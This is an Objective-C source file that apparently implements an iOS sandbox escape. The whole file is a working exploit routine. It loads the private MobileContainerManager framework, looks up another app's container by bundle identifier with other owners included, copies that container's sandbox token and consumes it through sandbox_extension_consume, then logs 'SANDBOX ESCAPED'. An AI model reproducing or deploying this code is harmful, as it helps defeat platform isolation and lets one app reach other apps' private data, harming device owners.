#import "SandboxEscape.h"
#import <dlfcn.h>
typedef void *container_query_t; typedef void *container_object_t;
@interface SandboxEscape () { int64_t _handle; BOOL _escaped; } @end
@implementation SandboxEscape
- (BOOL)escaped { return _escaped; } - (int64_t)sandboxHandle { return _handle; }
+ (instancetype)escapeForBundleID:(NSString *)bundleID error:(NSError **)err {
    void *h=dlopen("/System/Library/PrivateFrameworks/MobileContainerManager.framework/MobileContainerManager",RTLD_NOW);
    if(!h){ if(err)*err=[NSError errorWithDomain:@"sbx" code:1 userInfo:@{NSLocalizedDescriptionKey:@"MCM dlopen failed"}]; return nil; }
    container_query_t(*qc)(void)=dlsym(h,"container_query_create");
    void(*qs)(container_query_t,unsigned)=dlsym(h,"container_query_set_class");
    void(*qi)(container_query_t,const char*)=dlsym(h,"container_query_set_identifier");
    void(*qio)(container_query_t,bool)=dlsym(h,"container_query_set_include_other_owners");
    container_object_t(*qg)(container_query_t)=dlsym(h,"container_query_get_single_result");
    bool(*otok)(container_object_t,void**,unsigned long*)=dlsym(h,"container_copy_sandbox_token");
    void(*qf)(container_query_t)=dlsym(h,"container_query_free");
    int64_t(*consume)(const char*)=(int64_t(*)(const char*))dlsym(RTLD_DEFAULT,"sandbox_extension_consume");
    if(!qc||!qs||!qi||!qio||!qg||!otok||!consume){ if(err)*err=[NSError errorWithDomain:@"sbx" code:2 userInfo:@{NSLocalizedDescriptionKey:@"missing MCM symbols"}]; return nil; }
    container_query_t q=qc(); if(!q){ if(err)*err=[NSError errorWithDomain:@"sbx" code:3 userInfo:nil]; return nil; }
    qs(q,0x7); qi(q,bundleID.UTF8String); qio(q,true);
    container_object_t obj=qg(q);
    if(!obj){ if(qf)qf(q); if(err)*err=[NSError errorWithDomain:@"sbx" code:4 userInfo:@{NSLocalizedDescriptionKey:@"no container"}]; return nil; }
    void *tok=NULL; unsigned long tl=0;
    if(!otok(obj,&tok,&tl)||!tok){ if(qf)qf(q); if(err)*err=[NSError errorWithDomain:@"sbx" code:5 userInfo:nil]; return nil; }
    NSString *tokStr=[[NSString alloc] initWithBytes:tok length:tl encoding:NSUTF8StringEncoding];
    free(tok); if(qf)qf(q);
    if(!tokStr){ if(err)*err=[NSError errorWithDomain:@"sbx" code:6 userInfo:nil]; return nil; }
    int64_t handle=consume(tokStr.UTF8String);
    if(handle<0){ if(err)*err=[NSError errorWithDomain:@"sbx" code:7 userInfo:nil]; return nil; }
    SandboxEscape *s=[SandboxEscape new]; s->_handle=handle; s->_escaped=YES;
    NSLog(@"[Motor] SANDBOX ESCAPED handle=%lld bundle=%@",handle,bundleID);
    return s;
}
@end
